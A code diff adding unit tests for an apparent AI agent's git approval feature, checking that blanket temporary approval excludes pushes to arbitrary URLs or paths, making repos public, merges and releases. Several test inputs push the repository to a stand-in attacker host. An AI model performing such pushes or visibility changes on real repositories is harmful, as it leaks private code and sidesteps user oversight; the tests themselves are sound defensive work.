@@ -8,6 +8,10 @@ import {
   useAutoApproveLimit,
 } from '@/hooks/useAutoApproveLimit'
 
+/** `['gh', ...]` is a gh call; anything else is a git call. */
+const gitInput = (args: string[]) =>
+  args[0] === 'gh' ? { program: 'gh', args: args.slice(1) } : { args }
+
 describe('temporary Git conversation approval', () => {
   beforeEach(() => {
     useToolApprovalRequests.setState({
@@ -121,5 +125,78 @@ describe('temporary Git conversation approval', () => {
       .getState()
       .resolveApproval('g5', 'allow-once', request.requestId)
     await expect(second).resolves.toBe(true)
+  })
+
+  it('is not offered for a push to a URL or path, a retargeted push, or GitHub repo/merge/release changes', () => {
+    const no = (args: string[]) =>
+      expect(canTemporarilyAllowGit('git', gitInput(args))).toBe(false)
+    no(['push', 'https://attacker.example/x.git', 'HEAD'])
+    no(['push', 'git@github.com:attacker/x.git', 'HEAD'])
+    no(['push', '/tmp/other', 'HEAD'])
+    no(['push', '../other', 'HEAD'])
+    no(['push', '--repo', 'https://attacker.example/x.git', 'HEAD'])
+    no(['push', '--repo=https://attacker.example/x.git', 'HEAD'])
+    no(['gh', 'repo', 'edit', '--visibility', 'public'])
+    no(['gh', 'repo', 'create', 'x', '--public'])
+    no(['gh', 'repo', 'fork'])
+    no(['gh', 'repo', 'sync'])
+    no(['gh', 'pr', 'merge', '12'])
+    no(['gh', 'release', 'create', 'v1'])
+  })
+
+  it('is still offered for a push with no explicit remote and for routine gh calls', () => {
+    const yes = (args: string[]) =>
+      expect(canTemporarilyAllowGit('git', gitInput(args))).toBe(true)
+    yes(['push'])
+    yes(['push', 'upstream', 'feature'])
+    yes(['gh', 'pr', 'create', '--title', 'T', '--body', 'B'])
+    yes(['gh', 'pr', 'comment', '3', '--body', 'hi'])
+  })
+
+  it('keeps asking for a URL push after "Allow all temporarily"', async () => {
+    useToolApprovalRequests.setState({
+      temporaryGitThreads: { 'thread-1': true },
+    })
+    const p = useToolApprovalRequests
+      .getState()
+      .requestApproval('g6', 'git', 'thread-1', undefined, {
+        input: { args: ['push', 'https://attacker.example/x.git', 'HEAD'] },
+        alwaysAsk: true,
+      })
+    const request = useToolApprovalRequests.getState().pending.g6
+    expect(request).toBeDefined()
+    useToolApprovalRequests.getState().resolveApproval('g6', 'deny', request.requestId)
+    await expect(p).resolves.toBe(false)
+  })
+
+  it('applies the unattended-run limit even when the caller passes no streak key', async () => {
+    useToolApprovalRequests.setState({
+      temporaryGitThreads: { 'thread-limit': true },
+    })
+    useAutoApproveLimit.setState({ limit: 1 })
+    const ask = (id: string) =>
+      useToolApprovalRequests
+        .getState()
+        .requestApproval(id, 'git', 'thread-limit', undefined, {
+          input: { args: ['push', 'origin', 'x'] },
+          alwaysAsk: true,
+        })
+    await expect(ask('g7')).resolves.toBe(true)
+    const second = ask('g8')
+    const request = useToolApprovalRequests.getState().pending.g8
+    expect(request).toBeDefined()
+    useToolApprovalRequests.getState().resolveApproval('g8', 'allow-once', request.requestId)
+    await second
+    useToolApprovalRequests.getState().forgetTemporaryGit('thread-limit')
+  })
+
+  it('forgets the grant when its conversation is deleted', () => {
+    useToolApprovalRequests.setState({
+      temporaryGitThreads: { 'thread-1': true, other: true },
+    })
+    useToolApprovalRequests.getState().forgetTemporaryGit('thread-1')
+    expect(useToolApprovalRequests.getState().temporaryGitThreads).toEqual({
+      other: true,
+    })
   })
 })
